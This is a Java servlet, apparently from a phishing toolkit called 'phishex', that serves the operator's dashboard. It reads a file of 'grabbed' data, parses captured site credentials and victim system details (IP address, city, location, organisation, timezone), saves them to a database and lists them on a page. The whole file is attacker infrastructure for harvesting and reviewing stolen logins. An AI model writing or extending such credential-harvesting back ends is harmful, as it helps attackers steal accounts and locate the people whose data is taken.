package com.phishex.servlets;

import com.phishex.DataReader;
import com.phishex.DataWriter;
import com.phishex.dao.CredentialsDao;
import com.phishex.dao.SysInfoDao;
import com.phishex.entity.Credentials;
import com.phishex.entity.SysInfo;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

@WebServlet("/dashboard")
public class DashboardServlet extends HttpServlet {
    public static String site = "";

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
//            DataWriter writer = new DataWriter();
//            DataReader reader = new DataReader();
//            writer.start();
//            reader.start();

            // Data writer

            File file = new File("grabbed_data.txt");

            try {
                if (file.exists()) {
                    Credentials credentials = new Credentials();
                    SysInfo sysInfo = new SysInfo();

                    boolean credentialsIsSet = false;
                    boolean sysInfoIsSet = false;

                    Scanner scanner = new Scanner(file);
                    while (scanner.hasNextLine()) {
                        final String line = scanner.nextLine();
                        if (line.contains("GRABBED")) {
                            String data = line.split("#")[2];
                            site = line.split("#")[1];

                            credentials.setSite(site);
                            credentials.setData(data);

                            CredentialsDao credsDao = new CredentialsDao();
                            List<Credentials> credCheck = credsDao.findAll();

                            // Check unique
                            if (credCheck.size() > 0) {
                                if (!data.equals(credCheck.get(credCheck.size()-1).getData())) {
                                    credentialsIsSet = true;
                                }
                            }else{
                                credentialsIsSet = true;
                            }
                        }
                        if (line.contains("SYSINFO")) {
                            String jsonData = line.split("#")[1];
                            Object obj = new JSONParser().parse(jsonData);
                            JSONObject jo = (JSONObject) obj;

                            sysInfo.setIp((String) jo.get("ip"));
                            sysInfo.setCountry((String) jo.get("country"));
                            sysInfo.setCity((String) jo.get("city"));
                            sysInfo.setLocation((String) jo.get("loc"));
                            sysInfo.setOrganization((String) jo.get("org"));
                            sysInfo.setPostal((String) jo.get("postal"));
                            sysInfo.setTimezone((String) jo.get("timezone"));

                            sysInfoIsSet = true;
                        }
                    }
                    scanner.close();

                    if (credentialsIsSet && sysInfoIsSet && file.delete()) {
                        CredentialsDao credentialsDao = new CredentialsDao();
                        credentialsDao.insert(credentials);

                        SysInfoDao sysInfoDao = new SysInfoDao();
                        sysInfoDao.insert(sysInfo);
                    }
                }
            }catch (FileNotFoundException | ParseException e) {
                getErrorMessage(req, resp, e.getMessage(), "/WEB-INF/jsp/dashboard.jsp");
            }


            // Data reader
            CredentialsDao credentialsDao = new CredentialsDao();
            SysInfoDao sysInfoDao = new SysInfoDao();

            List<Credentials> credentials = credentialsDao.findAll();
            List<SysInfo> sysInfo = sysInfoDao.findAll();


            resp.setContentType("text/html");
            if(credentials.isEmpty()){
                req.setAttribute("credsError", "No data");
            }
            if(sysInfo.isEmpty()) {
                req.setAttribute("sysInfoError", "No data");
            }
            if(!credentials.isEmpty() && !sysInfo.isEmpty()) {
                req.setAttribute("credentials", credentials);
                req.setAttribute("sysInfo", sysInfo);
            }
            req.getRequestDispatcher("/WEB-INF/jsp/dashboard.jsp").forward(req, resp);
        } catch(Exception e){
            getErrorMessage(req, resp, e.getMessage(), "/WEB-INF/jsp/dashboard.jsp");
        }
    }

    public void getErrorMessage(HttpServletRequest req, HttpServletResponse resp, String mess, String path) throws ServletException, IOException {
        resp.setContentType("text/html");
        req.setAttribute("error", mess);
        req.getRequestDispatcher(path).forward(req, resp);
    }
}
